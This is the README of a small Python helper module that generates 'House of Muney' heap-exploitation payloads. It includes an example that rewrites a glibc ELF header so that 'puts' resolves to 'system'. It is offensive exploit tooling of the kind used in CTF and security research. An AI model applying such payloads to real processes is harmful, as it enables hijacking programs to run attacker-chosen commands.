# muney

`muney` is a semi-short module to assist with performing the house of muney. 

# API

### `#!python house_of_muney(glibc: ELF, resolve: dict[str, int]) -> bytes`
generate a minimal [house of muney](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation) payload. `glibc` should be the `ELF` you're hijacking, and `resolve` should be a dictionary of what symbols you'd like to be resolved to what. you should include the ASLR slide if you've previously set libc.address. it will return what you should overwrite the ELF header with.
```python
from dog import *
libc = ELF("./libc.so.6")
# libc.address = 0x12398235000 # works commented/uncommented
payload = house_of_muney(libc,{
    'puts': libc.sym['system'],
    'free': libc.sym['puts']
})
print(payload) # b'\x00\x00\x00\x00....'
```
